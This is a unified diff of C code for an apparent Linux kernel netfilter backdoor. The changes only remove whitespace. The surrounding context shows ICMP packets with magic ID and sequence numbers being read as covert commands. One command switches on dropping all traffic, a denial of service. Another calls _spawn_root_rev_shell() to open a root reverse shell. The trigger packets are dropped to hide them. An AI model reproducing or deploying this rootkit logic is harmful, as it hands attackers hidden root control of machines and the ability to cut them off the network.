@@ -44,13 +44,10 @@ _check_magic_packet(struct sk_buff *skb)
 
     if ((ntohs(icmp_header->un.echo.id) != MAGIC_ID) ||
             (ntohs(icmp_header->un.echo.sequence) != MAGIC_SEQ_NR)) {
-
         //packet ID and sequence number do not correspond to the magic numbers.
         return 0;
     }
-
     return 1;
-
 }
 
 static char *
@@ -79,19 +76,13 @@ _do_magic(struct sk_buff *skb)
 
     if (!strncmp(command, START_DOS, START_DOS_SIZE)) {
         drop_everything = 1;
-
         return NF_DROP;
-
     } else if (!strncmp(command, END_DOS, END_DOS_SIZE)) {
         drop_everything = 0;
-
         return NF_DROP;
-
     } else if (!strncmp(command, DO_REV_SHELL, DO_REV_SHELL_SIZE)) {
         _spawn_root_rev_shell();
-        
         return NF_DROP;
-
     } else {
         //invalid command -> do nothing.
         return NF_ACCEPT;
@@ -114,16 +105,13 @@ nf_callback(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
         if (_check_magic_packet(skb)) {
             _do_magic(skb);
         }
-
         return NF_DROP;
     }
-
 
     if (_check_magic_packet(skb)) {
         //Check if the packets contains a recognized command.
         return _do_magic(skb);
     }
-
     return NF_ACCEPT;
 }
 
